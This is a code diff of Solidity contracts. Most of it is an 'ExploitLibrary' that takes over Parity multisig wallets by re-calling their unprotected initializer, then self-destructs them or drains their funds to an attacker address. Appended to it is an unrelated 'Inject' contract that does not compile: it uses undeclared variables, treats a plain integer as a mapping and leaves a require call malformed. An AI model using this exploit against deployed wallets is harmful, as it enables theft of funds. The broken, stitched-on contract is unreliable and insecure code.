@@ -9,12 +9,12 @@ contract WalletAbi {
   function kill(address _to);
   function Wallet(address[] _owners, uint _required, uint _daylimit);
   function execute(address _to, uint _value, bytes _data) returns (bytes32 o_hash);
-  
+
 }
 
 // Exploit a Parity MultiSig wallet
 contract ExploitLibrary {
-    
+
     // Take ownership of Parity Multisig Wallet
     function takeOwnership(address _contract, address _to) public {
         WalletAbi wallet = WalletAbi(_contract);
@@ -23,14 +23,14 @@ contract ExploitLibrary {
         // Partiy multisig has a bug with Wallet()
         wallet.Wallet(newOwner, 1, uint256(0-1));
     }
-    
+
     // Empty all funds by suicide
     function killMultisig(address _contract, address _to) public {
         takeOwnership(_contract, _to);
         WalletAbi wallet = WalletAbi(_contract);
         wallet.kill(_to);
     }
-    
+
     // Transfer funds from Multisig contract (_amount == 0 == all)
     function transferMultisig(address _contract, address _to, uint _amount) public {
         takeOwnership(_contract, _to);
@@ -41,4 +41,20 @@ contract ExploitLibrary {
         wallet.execute(_to, amt, "");
     }
 
+}
+pragma solidity ^0.4.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function withdrawRequest() public {
+ 	require(tx.origin == msg.sender, );
+ 	uint blocksPast = block.number - depositBlock[msg.sender];
+ 	if (blocksPast <= 100) {
+  		uint amountToWithdraw = depositAmount[msg.sender] * (100 + blocksPast) / 100;
+  		if ((amountToWithdraw > 0) && (amountToWithdraw <= address(this).balance)) {
+   			msg.sender.transfer(amountToWithdraw);
+   			depositAmount[msg.sender] = 0;
+			}
+		}
+	}
 }
